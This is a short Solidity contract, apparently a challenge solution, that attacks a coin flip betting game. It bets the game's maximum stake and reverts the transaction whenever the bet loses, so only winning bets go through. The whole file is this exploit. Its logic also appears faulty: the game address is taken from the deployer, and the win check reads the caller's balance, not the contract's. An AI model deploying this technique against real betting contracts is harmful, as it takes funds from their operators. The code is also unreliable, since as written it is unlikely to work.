pragma solidity ^0.5.0;
interface CoinFlipGameInterface {
    function bet() external payable;
    function maxBet() external view returns(uint256);
    
}
contract HackCoinFlipGame {
    address owner;
    CoinFlipGameInterface coinflipgame;
    event LogWin(string);
    constructor() public payable {
         owner = msg.sender;
         coinflipgame = CoinFlipGameInterface(msg.sender);
    }
    
    function hackCoinflipGame() public {
        uint256 old_Balance = msg.sender.balance;
        uint256 maxBet = coinflipgame.maxBet();
        if (maxBet == 0)
        {
            return;
        }
        coinflipgame.bet.value(maxBet)();
        uint256 new_Balance = msg.sender.balance;
        require(old_Balance < new_Balance, "Sorry you lose!");
        emit LogWin("Great you hacked it!");
    }
    
    
    function balance () public view returns(uint256) {
        return address(this).balance;
    }

}
